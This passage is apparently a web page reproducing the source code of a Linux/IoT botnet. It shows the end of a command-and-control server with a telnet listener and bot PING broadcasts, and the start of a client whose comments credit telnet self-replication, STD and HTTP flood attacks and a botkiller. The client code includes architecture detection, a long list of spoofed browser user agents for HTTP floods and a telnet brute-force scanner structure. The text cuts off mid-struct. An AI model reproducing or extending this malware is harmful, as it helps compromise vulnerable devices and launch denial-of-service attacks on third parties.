();</span><br><span class="line">&#125;</span><br><span class="line">epollFD = epoll_create1 (<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (epollFD == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror (<span class="string">&quot;epoll_create&quot;</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line">event.data.fd = listenFD;</span><br><span class="line">event.events = EPOLLIN | EPOLLET;</span><br><span class="line">s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &amp;event);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror (<span class="string">&quot;epoll_ctl&quot;</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pthread_t</span> thread[threads + <span class="number">2</span>];</span><br><span class="line"><span class="keyword">while</span>(threads--)</span><br><span class="line">&#123;</span><br><span class="line">pthread_create( &amp;thread[threads + <span class="number">1</span>], <span class="literal">NULL</span>, &amp;epollEventLoop, (<span class="keyword">void</span> *) <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_create(&amp;thread[<span class="number">0</span>], <span class="literal">NULL</span>, &amp;telnetListener, port);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">broadcast(<span class="string">&quot;PING&quot;</span>, <span class="number">-1</span>, <span class="string">&quot;OBLIVION&quot;</span>);</span><br><span class="line">sleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line">close (listenFD);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="client-c"><a href="#client-c" class="headerlink" title="client.c"></a>client.c</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  BASE Client Made by Wicked</span></span><br><span class="line"><span class="comment">//  SelfRep Goes Into telnet.txt (say thanks to Seclusion for that)</span></span><br><span class="line"><span class="comment">//  Attacks, Ranges &amp; Botkiller Improved by Scarface</span></span><br><span class="line"><span class="comment">//  Decent STD Flood By Scarface</span></span><br><span class="line"><span class="comment">//  Improved HTTP Flood By Scarface</span></span><br><span class="line"><span class="comment">//  Binarys &amp; Ranges Added By By Scarface</span></span><br><span class="line"><span class="comment">//  Release date 27/3/2018 - by Scarface</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span>                                                      </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strings.h&gt;</span>                                                      </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/param.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VERSION <span class="meta-string">&quot;Vulcan&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PR_SET_NAME 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAD_RIGHT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAD_ZERO 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_BUF_LEN 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_IAC   255</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_WILL  251</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_WONT  252</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_DO    253</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_DONT  254</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPT_SGA   3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STD_PIGZ 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKBUF_SIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INET_ADDR(o1,o2,o3,o4) (htonl((o1 &lt;&lt; 24) | (o2 &lt;&lt; 16) | (o3 &lt;&lt; 8) | (o4 &lt;&lt; 0)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> <span class="keyword">ipv4_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GET BUILDS</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">getBuild</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">if</span> defined(__x86_64__) || defined(_M_X64)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;x86_64&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__i386) || defined(_M_IX86)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;x86_32&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ARM-4&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ARM-5&quot;</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__ARM_ARCH_6_) || defined(__ARM_ARCH_6T2_)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ARM-6&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(_mips__mips) || defined(__mips) || defined(__MIPS_) || defined(_mips)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;MIPS&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__sh__)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;SUPERH&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__powerpc) || defined(__powerpc_) || defined(_ppc_) || defined(__PPC__) || defined(_ARCH_PPC)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;POWERPC&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;UNKNOWN&quot;</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// USER AGENTS</span></span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *useragents[] = &#123;</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (PLAYSTATION 3; 3.55)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (PSP (PlayStation Portable); 2.00)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;PSP (PlayStation Portable); 2.00&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Bunjalloo/0.7.6(Nintendo DS;U;en)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Doris/1.15 [en] (Symbian)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000&quot;</span>,</span><br><span class="line">	<span class="string">&quot;MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">telstate_t</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">		<span class="keyword">uint32_t</span> ipz;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> ip;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> state;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> complete;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> usernameInd;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> passwordInd;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tempDirInd;</span><br><span class="line"><span class="keyword">uint32_t</span> totalTimeout;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> 